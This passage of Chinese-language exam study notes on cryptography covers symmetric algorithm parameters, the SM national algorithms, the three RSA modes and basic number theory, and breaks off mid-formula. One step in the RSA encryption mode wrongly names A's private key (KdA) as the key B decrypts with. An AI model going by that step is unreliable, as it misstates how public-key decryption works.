alt="image-20250723103601428"></p><ul><li><p>分类:</p><ul><li>分组加密算法：固定长度分组处理（如DES、3DES、IDEA、AES）</li><li>流加密算法：可变长度处理（如RC4/RC5），类似流水线作业</li></ul></li><li><p>DES核心参数:</p><ul><li>分组长度：<strong>64位</strong></li><li>密钥结构：<strong>64位总长度（含8位校验位）</strong>，有效密钥长度56位</li><li>运算特点：采用移位+替换进行16轮迭代</li></ul></li><li><p>3DES增强机制:</p><ul><li><p>加密流程：加密-解密-加密</p><p><img src="https://image.icewindy.cn/2025/07/b1e32688b208cf3640002fce2d144815.png" alt="image-20250723105523665"></p></li><li><p>密钥配置：通常K1=K3，<strong>默认密钥长度112位（56×2）</strong></p></li><li><p>变体情况：三密钥不同时为168位，三密钥相同时退化为56位</p></li></ul></li><li><p>IDEA特征:</p><ul><li>应用场景：PGP电子邮件加密</li><li>参数规格：<strong>64位分组，128位密钥</strong></li><li>设计特点：混合不同代数群运算</li></ul></li><li><p>AES优势:</p><ul><li>分组长度：<strong>128位</strong>（区别于其他算法的64位）</li><li>密钥选择：<strong>支持128/192/256位三种长度</strong></li><li>性能表现：硬件实现速度快，安全性与3DES相当</li></ul></li><li><p>RC系列特性:</p><ul><li>算法类型：<strong>流加密</strong>代表</li><li>性能对比：加密速度可达DES的10倍</li><li>灵活配置：分组和密钥长度均<strong>可变</strong></li></ul></li></ul><h2 id="国产加密算法">国产加密算法</h2><p><img src="https://image.icewindy.cn/2025/07/63fd62f80af8d6abc0980ee4dd8f4244.png" alt="image-20250723105721682"></p><ul><li>记忆要点：<ul><li>对称算法：SM1、SM4（两个算法分组长度和密钥长度都为128比特）</li><li>非对称算法：SM2（非对称加密，采用椭圆曲线）、SM9（标识密码）</li><li>哈希算法：SM3（分组512位，输出长度256位）</li></ul></li></ul><h2 id="非对称加密算法">非对称加密算法</h2><p>考试重点为RSA算法。</p><p><strong>公钥密码分类</strong></p><ul><li>基于大素数因子分解困难性：典型代表为RSA算法</li><li>基于离散对数问题困难性：包括DH、Elgamal、ECC(椭圆曲线密码)等</li></ul><h2 id="rsa">RSA</h2><h3 id="概述">概述</h3><ul><li>算法起源：由Ronald Rivest、Adi Shamir、Leonard Adleman三人发明，名称取自三人姓氏首字母</li><li>密钥特性：<ul><li>公钥和私钥均可用于加密，但加密与解密密钥必须相反配对</li><li>提供机密性、完整性、真实性和不可否认性保障</li></ul></li><li><strong>应用场景</strong>：SSH、OpenPGP、S/MIME和SSL/TLS都依赖于RSA进行<strong>加密和数字签名</strong>功能</li><li>密钥管理：<ul><li>用户需在KMC(密钥管理中心)登记个人信息和公钥</li><li>公钥存储于PKDB(Public Key Database)实现共享</li></ul></li></ul><h3 id="三种模式">三种模式</h3><ul><li><strong>加密模式</strong><ul><li><strong>核心功能</strong>：确保数据传输的<strong>机密性</strong></li><li><strong>加密流程</strong>：公钥加密→私钥解密<ol><li>发送方A查询PKDB获取接收方B的公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>e</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">KeB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span></li><li>用B的公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>e</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">KeB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>加密明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>得到密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span></li><li>B用私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>d</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">KdA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">d</span><span class="mord mathdefault">A</span></span></span></span>解密密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>得到明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span></li></ol></li></ul></li><li><strong>认证模式</strong><ul><li><strong>核心功能</strong>：验证数据来源的<strong>真实性</strong></li><li><strong>认证原理</strong>：成功解密证明消息确实由A发出</li><li><strong>认证流程</strong>：私钥加密→公钥解密<ol><li>发送方A使用私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>d</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">KdA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">d</span><span class="mord mathdefault">A</span></span></span></span>加密明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>得到密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span></li><li>B查询PKDB获取A的公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>e</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">KeA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault">A</span></span></span></span></li><li>用公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>e</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">KeA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault">A</span></span></span></span>解密密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>得到明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span></li></ol></li></ul></li><li><strong>加密认证混合模式</strong><ul><li><strong>核心功能</strong>：同时保证<strong>机密性和真实性</strong></li><li><strong>加密流程</strong>：<ol><li>A用私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>d</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">KdA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">d</span><span class="mord mathdefault">A</span></span></span></span>加密明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>得到中间密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span></li><li>再用B的公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>e</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">KeB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>加密中间密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>得到最终密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span></li><li>发送C给B</li><li>B用私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>d</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">KdB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>解出中间密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span></li><li>再用A的公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mi>e</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">KeA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault">A</span></span></span></span>解出明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span></li></ol></li><li><strong>技术特点</strong>：既防止内容泄露又验证发送方身份</li></ul></li></ul><h3 id="数学基础">数学基础</h3><h4 id="欧拉函数">欧拉函数</h4><ul><li>定义: 对于正整数﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>﻿，小于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>﻿且与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>﻿互素的正整数个数记为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></li><li>素数情况: 当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>﻿为素数时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\varphi(n)=n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>复合数情况: 若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n=p×q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>﻿（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>﻿为素数），则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li></ul><h4 id="欧几里得算法">欧几里得算法</h4><ul><li>表示方法:﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\operatorname{gcd}(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm" style="margin-right:0.01389em;">g</span><span class="mord mathrm">c</span><span class="mord mathrm">d</span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>﻿表示<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span></span></span></span>﻿的最大公约数</li><li>互质判定: 当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\operatorname{gcd}(a,b)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm" style="margin-right:0.01389em;">g</span><span class="mord mathrm">c</span><span class="mord mathrm">d</span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>﻿时，称﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span></span></span></span>﻿互质</li></ul><h4 id="同余">同余</h4><ul><li>定义: 若﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span></span></span></span>﻿除以﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>﻿余数相同，记作﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a \equiv b (\bmod m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span></li></ul><h4 id="求解乘法逆元">求解乘法逆元</h4><ul><li>问题形式: 解方程﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mo>×</mo><mi>d</mi><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>72</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">5×d \equiv 1 (\bmod 72)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">7</span><span class="mord">2</span><span class="mclose">)</span></span></span></span>﻿求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span></li><li>解题方法：<ul><li>转化为﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mi>d</mi><mo>−</mo><mn>1</mn><mo>=</mo><mn>72</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">5d-1=72n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">5</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">2</span><span class="mord mathdefault">n</span></span></span></span>﻿（﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>﻿为正整数）</li><li>代入<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3...</mn></mrow><annotation encoding="application/x-tex">n=1,2,3...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span>﻿测试</li><li>当﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">n=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>﻿时得﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><mn>29</mn></mrow><annotation 